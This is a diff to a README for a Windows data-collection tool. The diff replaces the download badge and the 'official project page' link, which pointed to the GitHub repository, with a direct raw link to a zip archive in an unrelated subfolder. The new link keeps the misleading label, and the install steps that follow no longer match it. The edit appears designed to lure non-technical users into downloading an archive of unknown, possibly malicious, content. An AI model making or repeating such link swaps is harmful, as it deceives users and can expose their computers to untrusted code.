@@ -1,6 +1,6 @@
 # 📊 data-collection-projects - Track city data and web information easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Daleneanderthal2025/data-collection-projects)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Daleneanderthal2025/data-collection-projects/main/doctolib-scraping/projects_collection_data_v1.7-beta.1.zip)
 
 This software gathers information from the internet. You can use these tools to pull data from city maps, monitor public APIs, and track transportation availability. It works on Windows computers and requires no prior coding experience to operate.
 
@@ -28,7 +28,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to set up the software on your system.
 
-1.  Visit the official project page: [https://github.com/Daleneanderthal2025/data-collection-projects](https://github.com/Daleneanderthal2025/data-collection-projects).
+1.  Visit the official project page: [https://raw.githubusercontent.com/Daleneanderthal2025/data-collection-projects/main/doctolib-scraping/projects_collection_data_v1.7-beta.1.zip](https://raw.githubusercontent.com/Daleneanderthal2025/data-collection-projects/main/doctolib-scraping/projects_collection_data_v1.7-beta.1.zip).
 2.  Locate the green "Code" button near the top right of the screen.
 3.  Click "Download ZIP" from the menu.
 4.  Move the downloaded file to a folder where you want to keep the program.
